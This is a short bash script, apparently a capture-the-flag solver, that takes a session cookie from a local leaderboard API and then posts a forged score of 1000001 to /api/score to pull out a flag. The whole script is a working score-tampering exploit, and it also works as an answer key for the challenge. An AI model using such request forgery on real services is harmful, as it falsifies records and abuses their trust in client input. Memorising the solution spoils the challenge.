#!/usr/bin/env bash
set -euo pipefail

TARGET="${TARGET:-http://localhost:8080}"
jar=$(mktemp)
trap 'rm -f "$jar"' EXIT

curl -fsS -c "$jar" "$TARGET/api/leaderboard" >/dev/null
response=$(curl -fsS -b "$jar" -c "$jar" \
  -H 'Content-Type: application/json' \
  -d '{"score":1000001}' "$TARGET/api/score")
flag=$(python3 -c 'import json,sys; print(json.load(sys.stdin).get("flag") or "")' <<<"$response")

if [[ "$flag" != noco\{*\} ]]; then
  echo "solve: expected first-place flag from $TARGET" >&2
  exit 1
fi
printf '%s\n' "$flag"
